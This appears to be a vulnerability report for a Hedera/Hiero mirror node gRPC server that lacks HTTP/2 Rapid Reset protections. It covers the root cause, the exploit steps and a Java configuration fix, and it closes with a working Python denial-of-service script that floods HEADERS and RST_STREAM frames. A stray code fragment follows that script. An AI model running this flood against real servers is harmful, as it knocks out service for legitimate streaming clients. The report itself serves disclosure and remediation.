### Title
Missing HTTP/2 Stream Rate Limiting in `grpcServerConfigurer` Enables Rapid Reset DoS (CVE-2023-44487 Pattern)

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the Netty gRPC server with only `maxConcurrentCallsPerConnection` (default: 5) and a thread executor. It omits all stream-lifecycle rate controls — no `maxConnectionAge`, no `maxConnectionIdle`, no `maxInboundMetadataSize`, and no per-connection stream-creation rate limit. An unauthenticated attacker can exploit the HTTP/2 Rapid Reset pattern (CVE-2023-44487) by rapidly sending HEADERS frames immediately followed by RST_STREAM frames, cycling through streams faster than the concurrent-call limit can engage, saturating the Netty event loop and starving legitimate streaming clients.

**Root cause and failed assumption:**

`maxConcurrentCallsPerConnection = 5` limits the number of *simultaneously active* gRPC streams per connection. The failed assumption is that this protects against stream-cycling abuse. It does not. In the Rapid Reset pattern, the attacker sends a HEADERS frame (opening a stream) and immediately sends RST_STREAM before the server can count it as a concurrent call. The stream is allocated and deallocated in the same event-loop tick or the next, so the concurrent limit is never reached. The attacker can sustain thousands of HEADERS+RST_STREAM pairs per second on a single long-lived TCP connection.

The following protections are entirely absent from `grpcServerConfigurer()`:
- `serverBuilder.maxConnectionAge(...)` — no connection lifetime cap; one TCP connection can sustain the attack indefinitely
- `serverBuilder.maxConnectionIdle(...)` — idle connections are never reaped
- `serverBuilder.maxInboundMetadataSize(...)` — HEADERS frames are unbounded in size, amplifying per-frame processing cost
- Any application-level stream-creation rate limiter (contrast with `web3/ThrottleConfiguration.java` which uses bucket4j for REST/web3 endpoints — no equivalent exists for gRPC)

**The only interceptor** is `GrpcInterceptor` (test path: `grpc/src/test/java/org/hiero/mirror/grpc/interceptor/GrpcInterceptor.java`), which only sets an `EndpointContext` thread-local and immediately delegates to `next.startCall()` — no rate limiting, no connection tracking, no authentication.

**Exploit flow:**

1. Attacker opens a TCP connection to port 5600 (no authentication required; the gRPC service is public per the Kubernetes ingress in `charts/hedera-mirror-grpc/values.yaml` lines 131–141).
2. Attacker sends HTTP/2 SETTINGS frame to complete the connection handshake.
3. Attacker enters a tight loop: send HEADERS (stream N) → send RST_STREAM (stream N) → increment stream ID by 2 → repeat.
4. Because each stream is reset before the server's concurrent-call counter increments past 0, `maxConcurrentCallsPerConnection = 5` never fires.
5. The Netty I/O thread (event loop) must process every HEADERS frame: parse HPACK-compressed headers, allocate `Http2Stream` state, invoke the gRPC transport layer, then process RST_STREAM and deallocate. At 10,000+ resets/second this fully occupies the event loop.
6. Legitimate `subscribeToTopic` or `getNodes` streaming calls queue behind the flood and time out.

### Impact Explanation

The gRPC service exposes `ConsensusService.subscribeToTopic` and `NetworkService.getNodes` — both are server-streaming RPCs used by Hedera clients to receive real-time topic messages and address book data. Saturating the Netty event loop causes:
- New legitimate streams to stall at the TCP/HTTP2 handshake phase
- Existing streams to stop receiving data (event loop is busy processing RST frames)
- Effective network partition for all streaming clients for the duration of the attack

No data is exfiltrated; the impact is pure availability loss. Severity is **High** (DoS of a public, unauthenticated, critical-path streaming API).

### Likelihood Explanation

- **No authentication required**: port 5600 is publicly routable per the ingress configuration.
- **No rate limiting at any layer in the gRPC module**: unlike the web3 module which has bucket4j throttling, the gRPC module has none.
- **Single attacker, single connection**: the attack requires only one TCP connection and a simple HTTP/2 client loop; no botnet needed.
- **Tooling exists**: `h2load`, `grpc-bench`, or a custom Python/Go script using `h2` or `grpcio` can generate thousands of RST resets per second trivially.
- **Repeatability**: the attacker can sustain the attack indefinitely because there is no `maxConnectionAge` to force reconnection overhead.

### Recommendation

Add the following to `grpcServerConfigurer()` in `GrpcConfiguration.java`:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    // Add these:
    serverBuilder.maxConnectionAge(1, TimeUnit.HOURS);
    serverBuilder.maxConnectionAgeGrace(30, TimeUnit.SECONDS);
    serverBuilder.maxConnectionIdle(5, TimeUnit.MINUTES);
    serverBuilder.maxInboundMetadataSize(8 * 1024); // 8 KB
    // grpc-java 1.58+ exposes maxRstFramesPerWindow via NettyServerBuilder
    // or configure at the Netty channel pipeline level
};
```

Expose `maxConnectionAge`, `maxConnectionIdle`, and `maxInboundMetadataSize` as fields in `NettyProperties` so they are operator-configurable. Additionally, add a gRPC `ServerInterceptor` that tracks per-IP stream creation rate using a sliding window (analogous to `ThrottleConfiguration` in the web3 module) and returns `RESOURCE_EXHAUSTED` when the rate is exceeded.

### Proof of Concept

```python
import socket, h2.connection, h2.config, h2.events, time

TARGET_HOST = "<mirror-node-host>"
TARGET_PORT = 5600

sock = socket.create_connection((TARGET_HOST, TARGET_PORT))
config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send(65535))

stream_id = 1
headers = [
    (':method', 'POST'),
    (':path', '/com.hedera.mirror.api.proto.ConsensusService/subscribeTopic'),
    (':scheme', 'http'),
    (':authority', f'{TARGET_HOST}:{TARGET_PORT}'),
    ('content-type', 'application/grpc'),
    ('te', 'trailers'),
]

start = time.time()
count = 0
while time.time() - start < 30:  # 30-second flood
    conn.send_headers(stream_id, headers)
    conn.reset_stream(stream_id)
    sock.sendall(conn.data_to_send(65535))
    stream_id += 2
    count += 1

print(f"Sent {count} HEADERS+RST_STREAM pairs in 30s")
# Expected: server event loop saturated; legitimate clients time out
```

**Preconditions**: network access to port 5600; no credentials needed.
**Trigger**: run the script above.

            ServerCall<ReqT, RespT> call, Metadata headers, ServerCallHandler<ReqT, RespT> next) {
